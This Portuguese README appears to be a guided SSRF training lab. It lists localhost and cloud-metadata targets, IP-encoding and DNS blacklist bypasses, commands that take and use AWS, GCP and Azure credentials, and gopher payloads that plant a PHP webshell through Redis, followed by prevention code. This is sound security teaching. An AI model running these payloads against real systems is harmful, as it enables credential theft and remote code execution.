# 🌐 Server-Side Request Forgery (SSRF) - Laboratório Guiado Completo

## 📋 Visão Geral

**Dificuldade**: 🟢 Iniciante → 🔴 Avançado
**Tempo estimado**: 4-6 horas
**Pontos**: 85 (10 + 30 + 45)

### O Que Você Vai Aprender

✅ Fundamentos de SSRF
✅ Acesso a serviços internos (localhost, rede interna)
✅ Cloud metadata exploitation (AWS, GCP, Azure)
✅ Bypass de blacklist (IP encoding, DNS tricks)
✅ DNS rebinding attacks
✅ Blind SSRF (out-of-band)
✅ Protocol smuggling (file://, gopher://, dict://)
✅ SSRF to RCE

---

## 📖 Teoria Completa

### O Que É SSRF?

Server-Side Request Forgery (SSRF) é uma vulnerabilidade que permite que atacantes façam requisições HTTP/outras a partir do servidor, acessando recursos internos ou externos não autorizados.

### Como Funciona?

#### Código Vulnerável Clássico

```python
# VULNERÁVEL ❌
import requests

url = request.args.get('url')
response = requests.get(url)
return response.text
```

**Input normal:**
```
?url=https://api.example.com/data
```

**Input malicioso:**
```
?url=http://localhost:8080/admin
?url=http://192.168.1.5/internal-api
?url=http://169.254.169.254/latest/meta-data/  # AWS metadata
```

### Por Que É Perigoso?

1. **Acesso a serviços internos** - Acessa localhost, rede interna
2. **Bypass de firewall** - Servidor faz requests de dentro da rede
3. **Cloud metadata** - Acessa credenciais AWS/GCP/Azure
4. **Port scanning** - Mapeia rede interna
5. **RCE** - Via Redis, Memcached, etc.

---

## 🎯 Tipos de SSRF

### 1. Basic SSRF (In-Band)

Resposta é retornada diretamente:

```python
url = request.args.get('url')
response = requests.get(url)
return response.text  # Resposta visível para atacante
```

### 2. Blind SSRF (Out-of-Band)

Sem resposta direta, detectável por:
- **DNS queries** - Monitora DNS lookups
- **HTTP logs** - Servidor atacante recebe request
- **Time delays** - Mede tempo de resposta

```python
url = request.args.get('url')
requests.get(url)  # Sem retornar resposta
return "Request enviado!"
```

---

## 💣 Alvos Comuns de SSRF

### 1. Localhost Services

```bash
http://localhost:80/
http://localhost:22/  # SSH
http://localhost:3306/  # MySQL
http://localhost:6379/  # Redis
http://localhost:8080/  # Admin panel
http://localhost:9200/  # Elasticsearch
```

### 2. Cloud Metadata

#### AWS (Amazon Web Services)

```bash
# Metadata service
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/

# IAM credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]

# Example output:
{
  "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token": "...",
  "Expiration": "2024-12-25T00:00:00Z"
}
```

#### GCP (Google Cloud Platform)

```bash
# Metadata
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Requires header: Metadata-Flavor: Google
```

#### Azure (Microsoft Azure)

```bash
# Metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Managed Identity
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Requires header: Metadata: true
```

### 3. Internal Network

```bash
# Rede privada RFC1918
http://10.0.0.1/
http://172.16.0.1/
http://192.168.1.1/

# Comum em empresas
http://admin.internal/
http://api.internal/
http://jenkins.internal/
```

---

## 🔓 Bypass de Blacklist

### 1. Representações Alternativas de Localhost

```bash
# Standard
http://localhost/
http://127.0.0.1/

# Short form
http://127.1/
http://127.0.1/
http://0.0.0.0/
http://0/

# IPv6
http://[::1]/
http://[0:0:0:0:0:0:0:1]/

# Decimal
http://2130706433/  # 127.0.0.1 em decimal

# Octal
http://0177.0.0.1/  # 0177 = 127 em octal
http://017700000001/  # 127.0.0.1 completo em octal

# Hexadecimal
http://0x7f.0.0.1/  # 0x7f = 127 em hex
http://0x7f000001/

# Mixed
http://0x7f.1/
http://127.0.0.0x1/

# Domain redirect
http://spoofed.burpcollaborator.net  # Resolve para 127.0.0.1

# Localhost.me services
http://127.0.0.1.nip.io/
http://127-0-0-1.nip.io/
```

### 2. Bypass com URL Parsing

```bash
# User@ trick
http://evil.com@127.0.0.1/
http://127.0.0.1@evil.com/  # Alguns parsers confundem

# Fragment
http://evil.com#127.0.0.1/
http://127.0.0.1#evil.com/

# URL encoding
http://127.0.0.1/  →  http://%31%32%37%2e%30%2e%30%2e%31/

# Double encoding
http://127.0.0.1/  →  http://%2531%2532%2537%252e%2530%252e%2530%252e%2531/

# Unicode/IDN
http://①②⑦.⓪.⓪.①/  # Unicode numbers
```

### 3. DNS Tricks

```bash
# Services que resolvem para IPs específicos
http://localtest.me/  # → 127.0.0.1
http://lvh.me/  # → 127.0.0.1
http://127.0.0.1.xip.io/  # → 127.0.0.1
http://127.0.0.1.nip.io/  # → 127.0.0.1

# Wildcard DNS próprio
http://subdomain.your-domain.com  # Configure para 127.0.0.1
```

### 4. Redirect-Based

```bash
# Servidor atacante retorna 302 redirect
http://evil.com/redirect  →  Location: http://localhost/admin

# Open redirect no target
http://target.com/redirect?url=http://localhost/
```

---

## 🌩️ Cloud Metadata Exploitation

### AWS - Steal IAM Credentials

```bash
# 1. List roles
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. Get credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]

# 3. Use credentials
aws s3 ls --profile stolen-creds
```

### GCP - Access Token

```bash
# Get token (requires header bypass)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Use token
curl -H "Authorization: Bearer [TOKEN]" https://www.googleapis.com/storage/v1/b
```

### Azure - Managed Identity

```bash
# Get token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Use token
curl -H "Authorization: Bearer [TOKEN]" https://management.azure.com/subscriptions?api-version=2020-01-01
```

---

## 🔬 Protocol Smuggling

### file:// - File Read

```bash
file:///etc/passwd
file:///c:/windows/win.ini
file:///proc/self/environ
file:///var/log/apache2/access.log
```

### gopher:// - Protocol Smuggling

```bash
# Redis exploitation
gopher://127.0.0.1:6379/_*1%0D%0A$8%0D%0Aflushall%0D%0A

# Memcached
gopher://127.0.0.1:11211/_%0Astats%0A

# MySQL
gopher://127.0.0.1:3306/...

# SMTP
gopher://127.0.0.1:25/_MAIL%20FROM:attacker@evil.com%0ARCPT%20TO:victim@target.com%0ADATA%0ASubject:%20SSRF%0A%0ABody
```

### dict:// - Port Scanning

```bash
dict://127.0.0.1:22/  # SSH
dict://127.0.0.1:3306/  # MySQL
dict://127.0.0.1:6379/  # Redis

# Resposta diferente = porta aberta
```

---

## 🎭 DNS Rebinding

### O Que É?

Técnica que explora TOCTOU (Time-of-Check Time-of-Use):

1. **Verificação**: Aplicação resolve DNS → IP externo (válido)
2. **Uso**: DNS muda para IP interno → Request vai para localhost

### Como Implementar

#### 1. Configure DNS autoritativo

```python
# DNS server que alterna IPs
import dnslib
import random

def dns_response(query):
    ips = ['1.2.3.4', '127.0.0.1']  # Alterna entre externo e interno
    return random.choice(ips)
```

#### 2. Use serviços prontos

```bash
# rbndr.us
http://7f000001.rbndr.us/  # Resolve 50% → 1.2.3.4, 50% → 127.0.0.1

# 1u.ms
http://7f000001.1u.ms/
```

---

## 💥 SSRF to RCE

### Via Redis

```bash
# 1. Flush database
gopher://127.0.0.1:6379/_*1%0D%0A$8%0D%0Aflushall%0D%0A

# 2. Write webshell
gopher://127.0.0.1:6379/_*3%0D%0A$3%0D%0Aset%0D%0A$5%0D%0Ashell%0D%0A$18%0D%0A<?php system($_GET[c]);?>%0D%0A

# 3. Save to file
gopher://127.0.0.1:6379/_*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$3%0D%0Adir%0D%0A$13%0D%0A/var/www/html%0D%0A*4%0D%0A$6%0D%0Aconfig%0D%0A$3%0D%0Aset%0D%0A$10%0D%0Adbfilename%0D%0A$9%0D%0Ashell.php%0D%0A*1%0D%0A$4%0D%0Asave%0D%0A

# 4. Access shell
http://target.com/shell.php?c=id
```

### Via Memcached

```bash
# Write data
gopher://127.0.0.1:11211/_%0Aset%20foo%200%200%205%0A<?php%20system($_GET[c]);?>%0A

# If logs/data accessible → RCE
```

---

## 🏗️ Estrutura do Laboratório

### 1. 🟢 Basic App (10 pontos)
- **Porta**: 5040
- **Cenário**: URL Fetcher/Proxy
- SSRF básico sem filtros
- Acesso a localhost

### 2. 🟡 Intermediate App (30 pontos)
- **Porta**: 5041
- **Cenário**: Webhook System
- Blacklist bypassável
- Cloud metadata access
- Multiple protocols

### 3. 🔴 Advanced App (45 pontos)
- **Porta**: 5042
- **Cenário**: Microservices
- DNS rebinding
- Blind SSRF
- SSRF to RCE (Redis)

---

## 🛡️ Prevenção

### 1. Whitelist de Domínios (MELHOR)

```python
ALLOWED_DOMAINS = ['api.example.com', 'cdn.example.com']

from urllib.parse import urlparse

url = request.args.get('url')
parsed = urlparse(url)

if parsed.hostname not in ALLOWED_DOMAINS:
    abort(403, "Domain not allowed")
```

### 2. Blacklist de IPs Privados

```python
import ipaddress
import socket

def is_safe_url(url):
    try:
        parsed = urlparse(url)

        # Resolve hostname
        ip = socket.gethostbyname(parsed.hostname)
        ip_obj = ipaddress.ip_address(ip)

        # Rejeita IPs privados
        if ip_obj.is_private or ip_obj.is_loopback:
            return False

        # Rejeita cloud metadata
        if ip == '169.254.169.254':
            return False

        return True
    except:
        return False
```

### 3. Segmentação de Rede

- Servidor web em DMZ separada
- Sem acesso direto a rede interna
- Firewall entre zonas

### 4. Disable URL Schemes Desnecessários

```python
import requests

# Desabilita file:// gopher:// dict://
session = requests.Session()
session.mount('file://', None)
session.mount('gopher://', None)
session.mount('dict://', None)
```

---

## 🎯 Checklist de Conclusão

- [ ] Entendi o que é SSRF
- [ ] Acessei localhost via SSRF
- [ ] Bypassei blacklist com IP alternativo
- [ ] Acessei cloud metadata (simulado)
- [ ] Testei protocol smuggling (file://)
- [ ] Explorei blind SSRF
- [ ] Scanneei portas internas
- [ ] Completei todos os exercícios

**Total**: 85 pontos

---

## 📚 Recursos

- [PortSwigger - SSRF](https://portswigger.net/web-security/ssrf)
- [HackTricks - SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
- [PayloadsAllTheThings - SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery)

**Próximo Lab**: [05 - Command Injection →](../05-command-injection/README.md)

---

**Boa sorte e happy hacking! 🌐**
